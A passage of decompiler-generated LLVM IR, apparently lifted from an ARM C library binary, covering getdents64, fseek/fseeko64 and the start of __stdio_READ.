  %v4_1b014 = zext i16 %v3_1b014 to i32
  store i32 %v4_1b014, i32* %r2.global-to-local, align 4
  %v1_1b018 = add i32 %v0_1b00c, 10
  %v2_1b018 = inttoptr i32 %v1_1b018 to i16*
  %v3_1b018 = load i16, i16* %v2_1b018, align 2
  %v4_1b018 = zext i16 %v3_1b018 to i32
  store i32 %v4_1b018, i32* %ip.global-to-local, align 4
  %v1_1b01c = add i32 %v0_1b00c, 12
  %v2_1b01c = inttoptr i32 %v1_1b01c to i16*
  %v3_1b01c = load i16, i16* %v2_1b01c, align 2
  %v4_1b01c = zext i16 %v3_1b01c to i32
  store i32 %v4_1b01c, i32* %lr.global-to-local, align 4
  %v1_1b020 = add i32 %v0_1b00c, 14
  %v2_1b020 = inttoptr i32 %v1_1b020 to i16*
  %v3_1b020 = load i16, i16* %v2_1b020, align 2
  %v4_1b020 = zext i16 %v3_1b020 to i32
  store i32 %v4_1b020, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1b02c = load i32, i32* %r5.global-to-local, align 4
  %v1_1b02c = add i32 %v0_1b02c, 72
  %v1_1b030 = inttoptr i32 %v1_1b02c to i32*
  store i32 %v2_1b010, i32* %v1_1b030, align 4
  %v3_1b030 = add i32 %v0_1b02c, 76
  %v4_1b030 = inttoptr i32 %v3_1b030 to i32*
  %v5_1b030 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b030, i32* %v4_1b030, align 4
  %v0_1b034 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b034 = inttoptr i32 %v0_1b034 to i32*
  %v2_1b034 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1b034, i32* %v1_1b034, align 4
  %v3_1b034 = add i32 %v0_1b034, 4
  %v4_1b034 = inttoptr i32 %v3_1b034 to i32*
  %v5_1b034 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1b034, i32* %v4_1b034, align 4
  %v0_1b038 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b038 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b038 = add i32 %v1_1b038, 32
  %v3_1b038 = inttoptr i32 %v2_1b038 to i32*
  store i32 %v0_1b038, i32* %v3_1b038, align 4
  %v0_1b03c = load i32, i32* %r7.global-to-local, align 4
  %v1_1b03c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b03c = add i32 %v1_1b03c, 36
  %v3_1b03c = inttoptr i32 %v2_1b03c to i32*
  store i32 %v0_1b03c, i32* %v3_1b03c, align 4
  %v0_1b040 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b040 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b040 = add i32 %v1_1b040, 16
  %v3_1b040 = inttoptr i32 %v2_1b040 to i32*
  store i32 %v0_1b040, i32* %v3_1b040, align 4
  %v0_1b044 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b044 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b044 = add i32 %v1_1b044, 20
  %v3_1b044 = inttoptr i32 %v2_1b044 to i32*
  store i32 %v0_1b044, i32* %v3_1b044, align 4
  %v0_1b048 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b048 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b048 = add i32 %v1_1b048, 24
  %v3_1b048 = inttoptr i32 %v2_1b048 to i32*
  store i32 %v0_1b048, i32* %v3_1b048, align 4
  %v0_1b04c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b04c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b04c = add i32 %v1_1b04c, 28
  %v3_1b04c = inttoptr i32 %v2_1b04c to i32*
  store i32 %v0_1b04c, i32* %v3_1b04c, align 4
  ret i32 %v2_1b010

; uselistorder directives
  uselistorder i32 %v0_1b00c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 72, { 10, 4, 5, 6, 7, 0, 12, 1, 2, 3, 8, 9, 11 }
  uselistorder i32 68, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 60, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 88, { 4, 0, 1, 2, 3, 5 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1b060 = load i32, i32* @r4, align 4
  %v6_1b060 = load i32, i32* @r5, align 4
  %v12_1b060 = load i32, i32* @r7, align 4
  %v1_1b064 = add i32 %arg3, 14
  %v2_1b06c = ptrtoint i32* %stack_var_-72 to i32
  %v1_1b070 = and i32 %v1_1b064, -8
  %v2_1b074 = sub i32 %v2_1b06c, %v1_1b070
  %v1_1b078 = add i32 %v2_1b074, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1b078, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1b0b4, label %dec_label_pc_1b0a0

dec_label_pc_1b0a0:                               ; preds = %entry
  %v0_1b0a0 = call i32 @__GI___errno_location()
  %v0_1b0a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b0a4 = sub i32 0, %v0_1b0a4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1b0ac = inttoptr i32 %v0_1b0a0 to i32*
  store i32 %v1_1b0a4, i32* %v2_1b0ac, align 4
  %v0_1b0bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b0bc

dec_label_pc_1b0b4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1b0bc, label %dec_label_pc_1b0c4

dec_label_pc_1b0bc:                               ; preds = %dec_label_pc_1b0b4, %dec_label_pc_1b0a0
  %v0_1b0bc = phi i32 [ -1, %dec_label_pc_1b0b4 ], [ %v0_1b0bc.pre, %dec_label_pc_1b0a0 ]
  store i32 %v0_1b0bc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b190

dec_label_pc_1b0c4:                               ; preds = %dec_label_pc_1b0b4
  %v2_1b0c4 = add i32 %v1_1b078, %arg1
  %v2_1b0c8 = add i32 %tmp, %arg3
  store i32 %v2_1b0c8, i32* @ip, align 4
  store i32 %v1_1b078, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b178

dec_label_pc_1b0e4:                               ; preds = %dec_label_pc_1b178
  %v1_1b0e4 = add i32 %v0_1b138, 16
  %v2_1b0e4 = inttoptr i32 %v1_1b0e4 to i16*
  %v3_1b0e4 = load i16, i16* %v2_1b0e4, align 2
  %v4_1b0e4 = zext i16 %v3_1b0e4 to i32
  %v1_1b0e8 = add nuw nsw i32 %v4_1b0e4, 7
  %v1_1b0ec = and i32 %v1_1b0e8, 131064
  store i32 %v1_1b0ec, i32* %r2.global-to-local, align 4
  %v2_1b0f4 = add i32 %v1_1b0ec, %v0_1b140
  store i32 %v2_1b0f4, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1b0f4, %v2_1b0c8
  br i1 %tmp26, label %dec_label_pc_1b100, label %dec_label_pc_1b134

dec_label_pc_1b100:                               ; preds = %dec_label_pc_1b0e4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1b108 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1b108, i32* %r2.global-to-local, align 4
  %v0_1b10c = load i32, i32* %sl.global-to-local, align 4
  %v1_1b110 = load i32, i32* @sp, align 4
  %v2_1b110 = inttoptr i32 %v1_1b110 to i32*
  store i32 0, i32* %v2_1b110, align 4
  %v4_1b114 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_1b108, i32 %v0_1b10c)
  %v0_1b118 = load i32, i32* @r5, align 4
  %v1_1b118 = load i32, i32* %r6.global-to-local, align 4
  %v9_1b118 = icmp eq i32 %v0_1b118, %v1_1b118
  br i1 %v9_1b118, label %dec_label_pc_1b120, label %dec_label_pc_1b18c

dec_label_pc_1b120:                               ; preds = %dec_label_pc_1b100
  %v0_1b120 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1b12c = inttoptr i32 %v0_1b120 to i32*
  store i32 22, i32* %v2_1b12c, align 4
  %v0_1b190.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b190

dec_label_pc_1b134:                               ; preds = %dec_label_pc_1b0e4
  %v1_1b134 = inttoptr i32 %v0_1b138 to i32*
  %v2_1b134 = load i32, i32* %v1_1b134, align 4
  %v3_1b134 = add i32 %v0_1b138, 4
  %v4_1b134 = inttoptr i32 %v3_1b134 to i32*
  %v5_1b134 = load i32, i32* %v4_1b134, align 4
  store i32 %v5_1b134, i32* %r4.global-to-local, align 4
  %v1_1b138 = add i32 %v0_1b138, 8
  store i32 %v1_1b138, i32* %sb.global-to-local, align 4
  %v1_1b13c = inttoptr i32 %v1_1b138 to i32*
  %v2_1b13c = load i32, i32* %v1_1b13c, align 4
  store i32 %v2_1b13c, i32* %sb.global-to-local, align 4
  %v3_1b13c = add i32 %v0_1b138, 12
  %v4_1b13c = inttoptr i32 %v3_1b13c to i32*
  %v5_1b13c = load i32, i32* %v4_1b13c, align 4
  store i32 %v5_1b13c, i32* %sl.global-to-local, align 4
  %v1_1b140 = inttoptr i32 %v0_1b140 to i32*
  store i32 %v2_1b134, i32* %v1_1b140, align 4
  %v3_1b140 = add i32 %v0_1b140, 4
  %v4_1b140 = inttoptr i32 %v3_1b140 to i32*
  %v5_1b140 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b140, i32* %v4_1b140, align 4
  %v0_1b144 = load i32, i32* @r7, align 4
  %v1_1b144 = add i32 %v0_1b144, 8
  %v1_1b148 = inttoptr i32 %v1_1b144 to i32*
  %v2_1b148 = load i32, i32* %v1_1b148, align 4
  %v3_1b148 = add i32 %v0_1b144, 12
  %v4_1b148 = inttoptr i32 %v3_1b148 to i32*
  %v5_1b148 = load i32, i32* %v4_1b148, align 4
  store i32 %v5_1b148, i32* @r4, align 4
  %v1_1b14c = load i32, i32* @r5, align 4
  %v2_1b14c = add i32 %v1_1b14c, 8
  %v3_1b14c = inttoptr i32 %v2_1b14c to i32*
  store i32 %v2_1b148, i32* %v3_1b14c, align 4
  %v0_1b150 = load i32, i32* @r4, align 4
  %v1_1b150 = load i32, i32* @r5, align 4
  %v2_1b150 = add i32 %v1_1b150, 12
  %v3_1b150 = inttoptr i32 %v2_1b150 to i32*
  store i32 %v0_1b150, i32* %v3_1b150, align 4
  %v0_1b154 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b154 = trunc i32 %v0_1b154 to i16
  %v2_1b154 = load i32, i32* @r5, align 4
  %v3_1b154 = add i32 %v2_1b154, 16
  %v4_1b154 = inttoptr i32 %v3_1b154 to i16*
  store i16 %v1_1b154, i16* %v4_1b154, align 2
  %v0_1b158 = load i32, i32* @r7, align 4
  %v1_1b158 = add i32 %v0_1b158, 18
  %v2_1b158 = inttoptr i32 %v1_1b158 to i8*
  %v3_1b158 = load i8, i8* %v2_1b158, align 1
  %v4_1b158 = zext i8 %v3_1b158 to i32
  store i32 %v4_1b158, i32* @r3, align 4
  %v2_1b15c = load i32, i32* @r5, align 4
  %v3_1b15c = add i32 %v2_1b15c, 18
  %v4_1b15c = inttoptr i32 %v3_1b15c to i8*
  store i8 %v3_1b158, i8* %v4_1b15c, align 1
  %v0_1b160 = load i32, i32* @r7, align 4
  %v1_1b160 = add i32 %v0_1b160, 16
  %v2_1b160 = inttoptr i32 %v1_1b160 to i16*
  %v3_1b160 = load i16, i16* %v2_1b160, align 2
  %v4_1b160 = zext i16 %v3_1b160 to i32
  %v1_1b164 = add nsw i32 %v4_1b160, -19
  store i32 %v1_1b164, i32* @r2, align 4
  %v0_1b168 = call i32 @memcpy()
  %v0_1b16c = load i32, i32* @r7, align 4
  %v1_1b16c = add i32 %v0_1b16c, 16
  %v2_1b16c = inttoptr i32 %v1_1b16c to i16*
  %v3_1b16c = load i16, i16* %v2_1b16c, align 2
  %v4_1b16c = zext i16 %v3_1b16c to i32
  %v0_1b170 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1b170, i32* @r5, align 4
  %v2_1b174 = add i32 %v4_1b16c, %v0_1b16c
  store i32 %v2_1b174, i32* @r7, align 4
  br label %dec_label_pc_1b178

dec_label_pc_1b178:                               ; preds = %dec_label_pc_1b0c4, %dec_label_pc_1b134
  %v0_1b140 = phi i32 [ %tmp, %dec_label_pc_1b0c4 ], [ %v0_1b170, %dec_label_pc_1b134 ]
  %v0_1b138 = phi i32 [ %v1_1b078, %dec_label_pc_1b0c4 ], [ %v2_1b174, %dec_label_pc_1b134 ]
  %v3_1b17c = icmp ult i32 %v0_1b138, %v2_1b0c4
  %v1_1b180 = add i32 %v0_1b140, 19
  store i32 %v1_1b180, i32* @r0, align 4
  %v1_1b184 = add i32 %v0_1b138, 19
  store i32 %v1_1b184, i32* @r1, align 4
  br i1 %v3_1b17c, label %dec_label_pc_1b0e4, label %dec_label_pc_1b18c.loopexit

dec_label_pc_1b18c.loopexit:                      ; preds = %dec_label_pc_1b178
  %v0_1b18c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1b18c

dec_label_pc_1b18c:                               ; preds = %dec_label_pc_1b18c.loopexit, %dec_label_pc_1b100
  %v1_1b18c = phi i32 [ %v0_1b140, %dec_label_pc_1b18c.loopexit ], [ %v0_1b118, %dec_label_pc_1b100 ]
  %v0_1b18c = phi i32 [ %v0_1b18c.pre, %dec_label_pc_1b18c.loopexit ], [ %v1_1b118, %dec_label_pc_1b100 ]
  %v2_1b18c = sub i32 %v1_1b18c, %v0_1b18c
  store i32 %v2_1b18c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b190

dec_label_pc_1b190:                               ; preds = %dec_label_pc_1b120, %dec_label_pc_1b0bc, %dec_label_pc_1b18c
  %v0_1b190 = phi i32 [ %v0_1b190.pre, %dec_label_pc_1b120 ], [ %v0_1b0bc, %dec_label_pc_1b0bc ], [ %v2_1b18c, %dec_label_pc_1b18c ]
  store i32 %v3_1b060, i32* %r4.global-to-local, align 4
  store i32 %v6_1b060, i32* @r5, align 4
  store i32 %v12_1b060, i32* @r7, align 4
  ret i32 %v0_1b190

; uselistorder directives
  uselistorder i32 %v0_1b138, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1b140, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_1b078, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3, 4 }
  uselistorder i32 18, { 2, 3, 5, 0, 1, 4 }
  uselistorder i32* @sp, { 8, 9, 19, 0, 10, 11, 12, 13, 14, 15, 16, 17, 1, 2, 3, 4, 5, 6, 18, 7 }
  uselistorder i32 14, { 4, 9, 11, 5, 8, 6, 1, 2, 3, 7, 0, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1b190, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b178, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1b1ac = load i32, i32* @r1, align 4
  store i32 %v0_1b1ac, i32* @r2, align 4
  %v0_1b1b4 = call i32 @__GI_fseeko64()
  ret i32 %v0_1b1b4
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_1b1c4 = load i32, i32* @r4, align 4
  %v6_1b1c4 = load i32, i32* @r5, align 4
  %v12_1b1c4 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_1b1d8 = load i32, i32* @r2, align 4
  store i32 %v0_1b1d8, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r6.global-to-local, align 4
  %v0_1b1e4 = load i32, i32* @r0, align 4
  store i32 %v0_1b1e4, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_1b200, label %dec_label_pc_1b1ec

dec_label_pc_1b1ec:                               ; preds = %entry
  %v0_1b1ec = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1b1f8 = inttoptr i32 %v0_1b1ec to i32*
  store i32 22, i32* %v2_1b1f8, align 4
  br label %dec_label_pc_1b2f0

dec_label_pc_1b200:                               ; preds = %entry
  %v1_1b200 = add i32 %v0_1b1e4, 52
  %v2_1b200 = inttoptr i32 %v1_1b200 to i32*
  %v3_1b200 = load i32, i32* %v2_1b200, align 4
  %v1_1b204 = sub i32 1, %v3_1b200
  store i32 %v1_1b204, i32* %r8.global-to-local, align 4
  %v2_1b204 = icmp ult i32 %v3_1b200, 2
  br i1 %v2_1b204, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_1b200
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1b24c

bb:                                               ; preds = %dec_label_pc_1b200
  %v2_1b20c = icmp eq i32 %v1_1b204, 0
  br i1 %v2_1b20c, label %dec_label_pc_1b24c, label %dec_label_pc_1b214

dec_label_pc_1b214:                               ; preds = %bb
  %v1_1b218 = add i32 %v0_1b1e4, 56
  store i32 %v1_1b218, i32* @r4, align 4
  %v4_1b21c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 36) to i32*), align 4
  store i32 %v4_1b21c, i32* %r1.global-to-local, align 4
  store i32 %v1_1b218, i32* %r2.global-to-local, align 4
  %v4_1b22c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1b22c)
  %v0_1b240 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b240 = add i32 %v0_1b240, 16
  %v3_1b240 = inttoptr i32 %v2_1b240 to i32*
  %v4_1b240 = load i32, i32* %v3_1b240, align 4
  store i32 %v4_1b240, i32* @ip, align 4
  store i32 111180, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1b240)
  %v0_1b24c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b24c

dec_label_pc_1b24c:                               ; preds = %.thread, %bb, %dec_label_pc_1b214
  %v0_1b258 = phi i32 [ %v0_1b1e4, %.thread ], [ %v0_1b1e4, %bb ], [ %v0_1b24c.pre, %dec_label_pc_1b214 ]
  %v1_1b24c = inttoptr i32 %v0_1b258 to i16*
  %v2_1b24c = load i16, i16* %v1_1b24c, align 2
  %v1_1b250 = and i16 %v2_1b24c, 64
  %v2_1b250 = icmp eq i16 %v1_1b250, 0
  br i1 %v2_1b250, label %dec_label_pc_1b268, label %dec_label_pc_1b258

dec_label_pc_1b258:                               ; preds = %dec_label_pc_1b24c
  store i32 %v0_1b258, i32* @r0, align 4
  %v0_1b25c = call i32 @__stdio_wcommit()
  %v2_1b260 = icmp eq i32 %v0_1b25c, 0
  br i1 %v2_1b260, label %dec_label_pc_1b268, label %dec_label_pc_1b2d0

dec_label_pc_1b268:                               ; preds = %dec_label_pc_1b258, %dec_label_pc_1b24c
  %v0_1b268 = load i32, i32* @r7, align 4
  %v7_1b268 = icmp eq i32 %v0_1b268, 1
  br i1 %v7_1b268, label %dec_label_pc_1b270, label %dec_label_pc_1b268.dec_label_pc_1b284_crit_edge

dec_label_pc_1b268.dec_label_pc_1b284_crit_edge:  ; preds = %dec_label_pc_1b268
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1b284

dec_label_pc_1b270:                               ; preds = %dec_label_pc_1b268
  %v0_1b270 = load i32, i32* @r5, align 4
  %v2_1b274 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1b274, i32* %r1.global-to-local, align 4
  %v2_1b278 = inttoptr i32 %v0_1b270 to i16*
  %v3_1b278 = call i32 @__stdio_adjust_position(i16* %v2_1b278, i32 %v2_1b274)
  %v1_1b27c = icmp slt i32 %v3_1b278, 0
  br i1 %v1_1b27c, label %dec_label_pc_1b2d0, label %dec_label_pc_1b270.dec_label_pc_1b284_crit_edge

dec_label_pc_1b270.dec_label_pc_1b284_crit_edge:  ; preds = %dec_label_pc_1b270
  %v0_1b284.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b284

dec_label_pc_1b284:                               ; preds = %dec_label_pc_1b268.dec_label_pc_1b284_crit_edge, %dec_label_pc_1b270.dec_label_pc_1b284_crit_edge
  %v2_1b28c.pre-phi = phi i32 [ %.pre, %dec_label_pc_1b268.dec_label_pc_1b284_crit_edge ], [ %v2_1b274, %dec_label_pc_1b270.dec_label_pc_1b284_crit_edge ]
  %v0_1b284 = phi i32 [ %v0_1b268, %dec_label_pc_1b268.dec_label_pc_1b284_crit_edge ], [ %v0_1b284.pre, %dec_label_pc_1b270.dec_label_pc_1b284_crit_edge ]
  store i32 %v0_1b284, i32* %r2.global-to-local, align 4
  %v0_1b288 = load i32, i32* @r5, align 4
  store i32 %v2_1b28c.pre-phi, i32* %r1.global-to-local, align 4
  %v4_1b290 = call i32 @__stdio_seek(i32 %v0_1b288, i32* nonnull %stack_var_-32, i32 %v0_1b284)
  %v1_1b294 = icmp slt i32 %v4_1b290, 0
  br i1 %v1_1b294, label %dec_label_pc_1b2d0, label %dec_label_pc_1b29c

dec_label_pc_1b29c:                               ; preds = %dec_label_pc_1b284
  %v0_1b29c = load i32, i32* @r5, align 4
  %v1_1b29c = inttoptr i32 %v0_1b29c to i16*
  %v2_1b29c = load i16, i16* %v1_1b29c, align 2
  %v1_1b2a0 = add i32 %v0_1b29c, 8
  %v2_1b2a0 = inttoptr i32 %v1_1b2a0 to i32*
  %v3_1b2a0 = load i32, i32* %v2_1b2a0, align 4
  store i32 %v3_1b2a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1b2a8 = and i16 %v2_1b29c, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_1b2a8, i16* %v1_1b29c, align 2
  %v0_1b2b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2b4 = load i32, i32* @r5, align 4
  %v2_1b2b4 = add i32 %v1_1b2b4, 28
  %v3_1b2b4 = inttoptr i32 %v2_1b2b4 to i32*
  store i32 %v0_1b2b4, i32* %v3_1b2b4, align 4
  %v0_1b2b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b2b8 = trunc i32 %v0_1b2b8 to i8
  %v2_1b2b8 = load i32, i32* @r5, align 4
  %v3_1b2b8 = add i32 %v2_1b2b8, 2
  %v4_1b2b8 = inttoptr i32 %v3_1b2b8 to i8*
  store i8 %v1_1b2b8, i8* %v4_1b2b8, align 1
  %v0_1b2bc = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2bc = load i32, i32* @r5, align 4
  %v2_1b2bc = add i32 %v1_1b2bc, 16
  %v3_1b2bc = inttoptr i32 %v2_1b2bc to i32*
  store i32 %v0_1b2bc, i32* %v3_1b2bc, align 4
  %v0_1b2c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2c0 = load i32, i32* @r5, align 4
  %v2_1b2c0 = add i32 %v1_1b2c0, 20
  %v3_1b2c0 = inttoptr i32 %v2_1b2c0 to i32*
  store i32 %v0_1b2c0, i32* %v3_1b2c0, align 4
  %v0_1b2c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2c4 = load i32, i32* @r5, align 4
  %v2_1b2c4 = add i32 %v1_1b2c4, 24
  %v3_1b2c4 = inttoptr i32 %v2_1b2c4 to i32*
  store i32 %v0_1b2c4, i32* %v3_1b2c4, align 4
  %v0_1b2c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b2c8 = load i32, i32* @r5, align 4
  %v2_1b2c8 = add i32 %v1_1b2c8, 44
  %v3_1b2c8 = inttoptr i32 %v2_1b2c8 to i32*
  store i32 %v0_1b2c8, i32* %v3_1b2c8, align 4
  br label %dec_label_pc_1b2d4

dec_label_pc_1b2d0:                               ; preds = %dec_label_pc_1b258, %dec_label_pc_1b284, %dec_label_pc_1b270
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b2d4

dec_label_pc_1b2d4:                               ; preds = %dec_label_pc_1b29c, %dec_label_pc_1b2d0
  %v0_1b2d4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b2d4 = icmp eq i32 %v0_1b2d4, 0
  br i1 %v2_1b2d4, label %dec_label_pc_1b2d4..thread8_crit_edge, label %bb20

dec_label_pc_1b2d4..thread8_crit_edge:            ; preds = %dec_label_pc_1b2d4
  %v0_1b2ec.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_1b2d4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1b2e4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b2e4 = add i32 %v1_1b2e4, 24
  %v4_1b2e4 = inttoptr i32 %v3_1b2e4 to i32*
  %v5_1b2e4 = load i32, i32* %v4_1b2e4, align 4
  store i32 %v5_1b2e4, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1b2d4..thread8_crit_edge, %bb20
  %v0_1b2ec = phi i32 [ %v0_1b2ec.pre, %dec_label_pc_1b2d4..thread8_crit_edge ], [ %v5_1b2e4, %bb20 ]
  %v2_1b2ec = xor i1 %v2_1b2d4, true
  call void @__pseudo_cond_branch(i1 %v2_1b2ec, i32 %v0_1b2ec)
  br label %dec_label_pc_1b2f0

dec_label_pc_1b2f0:                               ; preds = %dec_label_pc_1b1ec, %.thread8
  %v0_1b2f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1b1c4, i32* @r4, align 4
  store i32 %v6_1b1c4, i32* @r5, align 4
  store i32 %v12_1b1c4, i32* @r7, align 4
  ret i32 %v0_1b2f0

; uselistorder directives
  uselistorder i32 %v0_1b284, { 1, 0 }
  uselistorder i32 %v3_1b200, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 56, { 13, 15, 6, 7, 8, 9, 14, 5, 1, 0, 3, 16, 11, 17, 12, 10, 2, 18, 19, 4 }
  uselistorder label %dec_label_pc_1b2f0, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1b2d4, { 1, 0 }
  uselistorder label %dec_label_pc_1b2d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1b284, { 1, 0 }
  uselistorder label %dec_label_pc_1b24c, { 2, 1, 0 }
}

define i32 @function_1b304(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b304:
  %v0_1b304 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b304, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1b304
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1b304, %bb
  %v10_1b310 = phi i32 [ %arg1, %dec_label_pc_1b304 ], [ 0, %bb ]
  ret i32 %v10_1b310

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b314 = load i32, i32* @r4, align 4
  store i32 %v3_1b314, i32* %stack_var_-12, align 4
  %v0_1b318 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b318 = inttoptr i32 %v0_1b318 to i16*
  %v2_1b318 = load i16, i16* %v1_1b318, align 2
  %v3_1b318 = zext i16 %v2_1b318 to i32
  %v1_1b31c = and i32 %v3_1b318, 4
  store i32 %v1_1b31c, i32* %r5.global-to-local, align 4
  %v2_1b31c = icmp eq i32 %v1_1b31c, 0
  store i32 %v0_1b318, i32* %r4.global-to-local, align 4
  br i1 %v2_1b31c, label %dec_label_pc_1b330, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

